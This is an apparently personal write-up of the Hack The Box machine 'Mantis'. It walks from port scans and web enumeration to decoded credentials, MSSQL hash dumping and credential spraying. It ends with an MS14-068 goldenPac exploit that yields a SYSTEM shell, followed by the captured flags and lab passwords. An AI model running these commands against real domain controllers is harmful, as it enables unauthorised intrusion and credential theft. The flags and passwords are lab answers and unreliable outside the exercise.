# Mantis
>Author : Xyan1d3
>Date : 16th July 2021
>IP : 10.10.10.52
>OS : Windows Active Directory
>Difficulty : Hard
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Fri Jul 16 20:39:46 2021 as: nmap -sC -sV -v -oN nmap/mantis 10.10.10.52
Nmap scan report for 10.10.10.52
Host is up (0.081s latency).
Not shown: 981 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-16 15:10:02Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-07-16T15:08:57
| Not valid after:  2051-07-16T15:08:57
| MD5:   a23c 48c7 b3be db38 26e6 469e b45a f9ff
|_SHA-1: b92c c162 f3aa 70e3 779d fb65 b300 6f5c 58f2 2804
|_ssl-date: 2021-07-16T15:11:08+00:00; +5s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 48m05s, deviation: 1h47m21s, median: 4s
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2021-07-16T11:11:00-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-16T15:11:02
|_  start_date: 2021-07-16T15:08:28
```

## Crackmapexec
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/mantis]
└──╼ # crackmapexec smb 10.10.10.52
SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
```

## Nmap all open tcp ports with scripts
```sql
# Nmap 7.91 scan initiated Fri Jul 16 20:47:09 2021 as: nmap -p53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,49164,49166,49168,50255 -A -oN nmap/mantis-deep -v 10.10.10.52
Nmap scan report for mantis.htb.local (10.10.10.52)
Host is up (0.069s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-16 15:17:23Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-07-16T15:08:57
| Not valid after:  2051-07-16T15:08:57
| MD5:   a23c 48c7 b3be db38 26e6 469e b45a f9ff
|_SHA-1: b92c c162 f3aa 70e3 779d fb65 b300 6f5c 58f2 2804
|_ssl-date: 2021-07-16T15:18:33+00:00; +5s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49164/tcp open  msrpc        Microsoft Windows RPC
49166/tcp open  msrpc        Microsoft Windows RPC
49168/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-07-16T15:08:57
| Not valid after:  2051-07-16T15:08:57
| MD5:   a23c 48c7 b3be db38 26e6 469e b45a f9ff
|_SHA-1: b92c c162 f3aa 70e3 779d fb65 b300 6f5c 58f2 2804
|_ssl-date: 2021-07-16T15:18:33+00:00; +5s from scanner time.

Host script results:
|_clock-skew: mean: 34m22s, deviation: 1h30m43s, median: 4s
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2021-07-16T11:18:25-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-16T15:18:27
|_  start_date: 2021-07-16T15:08:28

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   70.85 ms 10.10.14.1
2   70.96 ms mantis.htb.local (10.10.10.52)
```

- SMB has no anonymous shares.
- RPC does not allow to do enumeration.
- LDAP Enumeration requires credentials.


## Web Enumeration
The Webserver on port `8080/tcp` is hosting `Orchard CMS`.
![[Pasted image 20210716211033.png]]

### Gobuster on 8080/tcp
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/mantis]
└──╼ # gobuster dir -u http://10.10.10.52:8080 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gobuster.out -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.52:8080
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/16 21:02:14 Starting gobuster in directory enumeration mode
===============================================================
/archive              (Status: 200) [Size: 2866]
/blogs                (Status: 200) [Size: 2913]
/admin                (Status: 302) [Size: 163] [--> /Users/Account/AccessDenied?ReturnUrl=%2Fadmin]
/tags                 (Status: 200) [Size: 2453]
/pollarchive          (Status: 200) [Size: 2870]
/newsarchive          (Status: 200) [Size: 2870]
/news_archive         (Status: 200) [Size: 2871]
/*checkout*           (Status: 400) [Size: 3420]
```
We see nothing useful there.

The site on `1337/tcp` is hosting an `IIS 7` default page.
![[Pasted image 20210716211123.png]]
### Gobuster on 1337/tcp
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/mantis]
└──╼ # gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gobuster1337.out -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.52:1337
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/16 21:02:17 Starting gobuster in directory enumeration mode
===============================================================
/orchard              (Status: 500) [Size: 3026]
/secure_notes         (Status: 301) [Size: 160] [--> http://10.10.10.52:1337/secure_notes/]
```

On doing a `gobuster` we find that we have a webdirectory named `/secure_notes`, Which we can take a look at.
![[Pasted image 20210716211230.png]]

The `web.config` is not accessible.
But the `dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt` is accessible.

We see that the `dev_notes` file consists of some data.
![[Pasted image 20210716211531.png]]
![[Pasted image 20210716211543.png]]

The Orchard CMS credentials are :
We have to `base64` decode it and then `hex` decode it to get the credentials.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/mantis]
└──╼ # echo -n "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" |base64 -d
6d2424716c5f53405f504073735730726421
```
![[Pasted image 20210716212545.png]]

The Orchard CMS credentials are acctually binary encoded.
![[Pasted image 20210716213319.png]]

## MS-SQL Enumeration
We could try to use the credentials to login to the `mssql` server.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/mantis]
└──╼ # mssqlclient.py mantis.htb.local/admin@10.10.10.52
Impacket v0.9.23.dev1+20210419.165326.f9453d21 - Copyright 2020 SecureAuth Corporation

Password: m$$ql_S@_P@ssW0rd!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208)
[!] Press help for extra shell commands
SQL>
```

We could now try to enumerate the database and try to find some information.
```python
SQL> SELECT name FROM master.dbo.sysdatabases
name
--------------------------------------------------------------------------------------------------------------------------------   

master

tempdb

model

msdb

orcharddb
SQL> use orcharddb
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.
SQL> SELECT table_name FROM information_schema.tables;
table_name

--------------------------------------------------------------------------------------------------------------------------------   

blog_Orchard_Blogs_RecentBlogPostsPartRecord

blog_Orchard_Blogs_BlogArchivesPartRecord

blog_Orchard_Workflows_TransitionRecord

blog_Orchard_Workflows_WorkflowRecord

*** SNIP ***

blog_Orchard_Users_UserPartRecord

*** SNIP ***
SQL> select Username,Password from blog_Orchard_Users_UserPartRecord
Username     Password
--------     ---------
admin        AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==                                                  
James        
```

We could try out the credentials on all the users.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/mantis]
└──╼ # crackmapexec smb 10.10.10.52 -u users.lst -p password.lst --continue-on-success
SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.52     445    MANTIS           [-] htb.local\james:m$$ql_S@_P@ssW0rd! STATUS_LOGON_FAILURE 
SMB         10.10.10.52     445    MANTIS           [-] htb.local\james:@dm!n_P@ssW0rd! STATUS_LOGON_FAILURE 
SMB         10.10.10.52     445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd!
```
![[Pasted image 20210716221055.png]]

# Initial FootHold as `NT Authority/SYSTEM`
We could use the `goldenPac.py` as it is a `Windows Server 2008` to abuse `MS14-068` ,forge a golden ticket and `psexec` into the box.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/mantis]
└──╼ # goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 htb.local/james@mantis.htb.local
Impacket v0.9.23.dev1+20210419.165326.f9453d21 - Copyright 2020 SecureAuth Corporation

Password:                 
[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller 10.10.10.52
[*] 10.10.10.52 found vulnerable!   
[*] Requesting shares on 10.10.10.52.....
[*] Found writable share ADMIN$         
[*] Uploading file AEtsVAPA.exe          
[*] Opening SVCManager on 10.10.10.52.....     
[*] Creating service EnMj on 10.10.10.52.....
[*] Starting service EnMj.....                                                      
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
                                          
C:\Windows\system32>whoami
nt authority\system
```

![[Pasted image 20210716225530.png]]
## Getting the user Flag
```python
C:\Users\james\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 1A7A-6541

 Directory of C:\Users\james\Desktop

09/01/2017  02:10 PM    <DIR>          .
09/01/2017  02:10 PM    <DIR>          ..
09/01/2017  10:19 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   4,922,269,696 bytes free

C:\Users\james\Desktop>type user.txt
8a8622e2872d13d1162fbe92ce38f54d
```

## Getting the root Flag
```python
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 1A7A-6541

 Directory of C:\Users\Administrator\Desktop

02/08/2021  01:44 PM    <DIR>          .
02/08/2021  01:44 PM    <DIR>          ..
09/01/2017  10:16 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   4,922,335,232 bytes free

C:\Users\Administrator\Desktop>type root.txt
209dc756ee5c09a9967540fe18d15567
```

# Credentials
|Username|Password|Found From|
|--|--|--|--|
|Orchard CMS|admin|`@dm!n_P@ssW0rd!`|Found by `base64` decoding the filename `http://10.10.10.52:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt`|
|MS-SQL|sa|`m$$ql_S@_P@ssW0rd!`|Found by decoding the `Bacon` Cipher from `dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt`|
|System|james|`J@m3s_P@ssW0rd!`|Found the credentials from the `MS-SQL`|